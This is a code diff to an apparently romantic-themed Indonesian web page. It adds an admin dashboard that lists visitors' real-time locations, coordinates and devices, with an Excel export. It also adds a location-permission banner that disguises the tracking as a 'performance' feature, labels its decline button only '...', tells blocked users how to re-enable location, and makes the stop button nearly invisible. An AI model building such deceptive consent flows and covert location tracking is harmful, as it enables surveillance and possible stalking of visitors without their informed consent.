@@ -47,6 +47,7 @@
     <!-- Firebase (v9 Compatibility Mode) -->
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
     
     <!-- Custom CSS -->
     <link rel="stylesheet" href="style.css">
@@ -290,6 +291,33 @@
                 </div>
             </div>
 
+            <!-- TABEL LOKASI REAL-TIME -->
+            <div class="space-y-3">
+                <div class="flex items-center justify-between">
+                    <h4 class="text-xs font-semibold text-slate-300 uppercase tracking-wider">📍 Lokasi Pengunjung Real-Time:</h4>
+                    <button onclick="exportToExcel()" class="text-[11px] bg-emerald-600/80 hover:bg-emerald-500 text-white px-3 py-1.5 rounded-lg">⬇️ Download Excel</button>
+                </div>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Status</th>
+                                <th>Sesi ID</th>
+                                <th>Perangkat</th>
+                                <th>Lokasi</th>
+                                <th>Koordinat</th>
+                                <th>Akurasi</th>
+                                <th>Update Terakhir</th>
+                                <th>Peta</th>
+                            </tr>
+                        </thead>
+                        <tbody id="locationTableBody">
+                            <tr><td colspan="8" class="text-center text-slate-400">Memuat data lokasi...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
             <!-- TABEL 1: PENGUNJUNG ONLINE -->
             <div class="space-y-3">
                 <h4 class="text-xs font-semibold text-slate-300 uppercase tracking-wider">🟢 Pengunjung Aktif Saat Ini (Online):</h4>
@@ -323,11 +351,12 @@
                                 <th>Waktu Akses</th>
                                 <th>Sesi ID</th>
                                 <th>Perangkat / Browser</th>
+                                <th>Lokasi Terakhir</th>
                                 <th>Status Akhir</th>
                             </tr>
                         </thead>
                         <tbody id="historyTableBody">
-                            <tr><td colspan="4" class="text-center text-slate-400">Belum ada riwayat kunjungan.</td></tr>
+                            <tr><td colspan="5" class="text-center text-slate-400">Belum ada riwayat kunjungan.</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -425,6 +454,26 @@
         </div>
     </div>
 
+    <!-- BANNER IZIN LOKASI PENGUNJUNG -->
+    <div id="geoConsentBanner" class="fixed bottom-4 inset-x-4 z-50 max-w-md mx-auto hidden">
+        <div class="glass-card rounded-2xl p-4 space-y-3">
+            <p class="text-sm font-medium text-slate-100">📍 aktifkan fitur untuk memaksimalkan kinerja website</p>
+            <p class="text-xs text-slate-400">untuk ingin mematikan fitur ini,hubungi admin.</p>
+            <div class="flex gap-2">
+                <button onclick="acceptLocationSharing()" class="flex-1 bg-gradient-to-r from-romantic-rose to-pink-600 text-white text-sm font-semibold py-2 rounded-xl">Izinkan</button>
+                <button onclick="declineLocationSharing()" class="flex-1 bg-white/5 border border-white/10 text-slate-300 text-sm py-2 rounded-xl">...</button>
+            </div>
+        </div>
+    </div>
+    <div id="geoBlockedHint" class="fixed bottom-4 inset-x-4 z-50 max-w-md mx-auto hidden">
+        <div class="glass-card rounded-2xl p-4 space-y-2">
+            <p class="text-sm font-medium text-slate-100">📍 Izin lokasi sedang diblokir browser.</p>
+            <p class="text-xs text-slate-400">Klik ikon gembok / izin di sebelah alamat website, ubah Lokasi menjadi "Izinkan", lalu refresh halaman.</p>
+            <button onclick="document.getElementById('geoBlockedHint').classList.add('hidden')" class="text-xs bg-white/5 border border-white/10 text-slate-300 px-3 py-1.5 rounded-lg">Tutup</button>
+        </div>
+    </div>
+    <button id="geoStopBtn" onclick="stopLocationSharing()" class="fixed bottom-4 right-4 z-40 hidden glass-card text-[9px] text-slate-300 px-2 py-1 rounded-full opacity-10 hover:opacity-100 transition-opacity">📍 Lokasi aktif · Berhenti</button>
+
     <!-- WIDGET LOGIN ADMIN SAMAR (POJOK KIRI BAWAH) -->
     <div class="admin-login-widget">
         <button class="admin-toggle-btn" onclick="toggleLoginBox()">
@@ -441,6 +490,7 @@
     </div>
 
     <!-- Custom Script JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
     <script src="script.js"></script>
 </body>
 </html>
